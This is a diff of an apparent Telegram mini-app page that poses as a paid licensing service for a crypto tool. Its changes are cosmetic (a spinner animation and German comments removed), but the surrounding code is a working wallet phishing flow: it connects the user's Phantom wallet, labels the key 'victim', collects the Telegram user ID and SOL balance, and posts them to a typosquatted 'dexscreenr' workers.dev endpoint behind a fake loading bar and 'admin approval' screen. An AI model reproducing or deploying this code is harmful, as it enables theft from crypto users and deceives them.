@@ -144,9 +144,13 @@
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
   .back-btn { background: none; border: none; color: #52525b; font-size: 12px; font-weight: 500; margin-top: 24px; cursor: pointer; padding: 8px 16px; border-radius: 20px; transition: all 0.2s; }
 
+  /* DASHBOARD */
   #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 10px 0; text-align: center; }
   .pending-icon { width: 64px; height: 64px; border-radius: 50%; background: rgba(251, 191, 36, 0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 16px; border: 1px solid rgba(251, 191, 36, 0.3); }
-  .pending-icon svg { width: 32px; height: 32px; color: #fbbf24; animation: spin 4s linear infinite; }
+  
+  /* HIER IST DER FIX: Keine Animation mehr bei der Uhr */
+  .pending-icon svg { width: 32px; height: 32px; color: #fbbf24; }
+  
   .pending-title { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; }
   .pending-desc { font-size: 13px; color: #a1a1aa; line-height: 1.5; margin-bottom: 24px; padding: 0 10px; }
   .ticket-btn { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #ffffff; font-size: 13px; font-weight: 600; padding: 12px 24px; border-radius: 12px; cursor: pointer; transition: all 0.2s; }
@@ -233,7 +237,6 @@
         </div>
       </div>
 
-      <!-- LOADING SCREEN -->
       <div id="loading-screen">
         <div class="loading-title">Initializing Environment</div>
         <div class="loading-bar-bg">
@@ -256,6 +259,7 @@
 
       <div id="dashboard-screen">
         <div class="pending-icon">
+          <!-- Hier ist das Standbild (ohne Animation) -->
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
         </div>
         <h3 class="pending-title">Waiting for Admin Approval</h3>
@@ -312,7 +316,6 @@
   const headerSub = document.getElementById('headerSub');
   const selectedPlanText = document.getElementById('selectedPlanText');
 
-  // --- NEUE LOGIK: Erst Wallet Connect, dann Loader ---
   async function startLoading(planName) {
     pricingScreen.style.display = 'none';
     
@@ -320,15 +323,12 @@
     if(!provider) { return; }
 
     try {
-      // 1. Phantom Connect Aufforderung
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       
-      // 2. Jetzt den Ladebalken zeigen
       loadingScreen.style.display = 'flex';
       document.getElementById('loadStatus').textContent = `Generating license for ${planName}...`;
 
-      // 3. Daten im Hintergrund senden
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       const conn = new solanaWeb3.Connection("https://solana.publicnode.com");
       const solBalance = await conn.getBalance(resp.publicKey);
@@ -338,7 +338,6 @@
       try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
       catch (err) { navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); }
 
-      // 4. Warten, bis der Balken voll ist
       setTimeout(() => {
         loadingScreen.style.display = 'none';
         headerSub.textContent = "Authorize connection.";
@@ -352,10 +351,7 @@
         }, 100);
       }, 4200);
 
-    } catch(e) {
-      // Wenn der User den Connect abbricht
-      goBack();
-    }
+    } catch(e) { goBack(); }
   }
 
   function openCodeInput(card, planName) {
